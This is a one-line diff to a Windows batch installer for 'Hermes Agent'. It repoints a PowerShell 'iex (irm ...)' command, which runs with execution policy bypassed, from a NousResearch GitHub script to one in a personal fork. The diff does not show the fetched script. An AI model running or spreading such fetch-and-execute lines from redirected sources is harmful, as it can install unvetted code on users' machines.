@@ -16,7 +16,7 @@ echo  Hermes Agent Installer
 echo  Launching PowerShell installer...
 echo.
 
-powershell -ExecutionPolicy ByPass -NoProfile -Command "iex (irm https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.ps1)"
+powershell -ExecutionPolicy ByPass -NoProfile -Command "iex (irm https://raw.githubusercontent.com/eliazulai29/hermes-agent/main/scripts/install.ps1)"
 
 if %ERRORLEVEL% NEQ 0 (
     echo.
